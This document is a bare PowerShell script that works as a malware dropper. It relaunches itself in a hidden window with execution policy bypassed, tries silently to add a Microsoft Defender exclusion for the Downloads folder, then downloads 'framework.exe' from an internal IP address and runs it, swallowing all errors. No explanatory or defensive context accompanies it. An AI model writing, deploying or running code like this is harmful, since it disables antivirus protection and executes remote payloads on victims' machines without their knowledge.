function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-WindowsPowerShell

try {
    # Attempt Defender Exclusion (will fail silently if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
}
catch {}

try {
    # === Payload download ===
    $url = "http://192.168.0.100/framework.exe"
    $output = Join-Path $env:USERPROFILE "Downloads\framework.exe"

    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

    # === Execute downloaded EXE ===
    Start-Process -FilePath $output
}
catch {
    # Silent failure
}
